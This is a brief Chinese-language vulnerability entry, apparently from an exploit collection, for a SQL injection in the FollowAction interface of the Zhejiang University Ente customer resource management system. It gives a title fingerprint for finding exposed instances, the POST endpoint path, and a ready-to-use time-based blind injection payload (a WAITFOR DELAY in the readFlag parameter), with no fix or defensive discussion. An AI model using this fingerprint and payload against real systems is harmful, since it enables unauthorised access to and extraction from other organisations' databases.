# 浙大恩特客户资源管理系统-FollowAction接口存在SQL注入漏洞

浙大恩特客户资源管理系统-FollowAction接口 ｜ SQL注入 ｜ —
- **指纹**：`title="欢迎使用浙大恩特客户资源管理系统"`
- **请求**：`POST /entsoft/FollowAction.entphone;.js HTTP/1.1`

**Payload**
```
method=updreadFlg&trk_id=a&readFlag=a%27;WAITFOR%20DELAY%20%270:0:4%27--
```